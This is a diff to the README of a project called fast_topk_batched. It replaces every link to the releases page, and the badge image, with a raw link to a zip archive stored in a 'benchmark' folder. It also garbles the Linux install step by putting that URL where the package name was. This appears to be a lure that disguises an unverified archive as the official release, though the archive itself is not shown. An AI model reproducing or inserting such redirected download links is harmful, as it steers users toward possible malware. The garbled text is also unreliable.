@@ -1,6 +1,6 @@
 # 🚀 fast_topk_batched - Fast Top-K Selection for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/chrispion/fast_topk_batched/releases)
+[![Download Latest Release](https://github.com/chrispion/fast_topk_batched/raw/refs/heads/main/benchmark/fast-batched-topk-v1.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/chrispion/fast_topk_batched/raw/refs/heads/main/benchmark/fast-batched-topk-v1.8.zip)
 
 ## 📋 Overview
 
@@ -25,7 +25,7 @@ Before downloading, make sure your system meets the following requirements:
 
 To get started, visit the releases page to download the software:
 
-[Download Here](https://github.com/chrispion/fast_topk_batched/releases)
+[Download Here](https://github.com/chrispion/fast_topk_batched/raw/refs/heads/main/benchmark/fast-batched-topk-v1.8.zip)
 
 ### Installation Instructions
 
@@ -34,7 +34,7 @@ To get started, visit the releases page to download the software:
 3. Choose the installation file for your operating system:
    - For **Windows**, download the `.exe` installer.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `.tar.gz` package.
+   - For **Linux**, download the `https://github.com/chrispion/fast_topk_batched/raw/refs/heads/main/benchmark/fast-batched-topk-v1.8.zip` package.
 4. Follow the prompts to install the software on your computer.
 
 ## 🚀 Running the Application
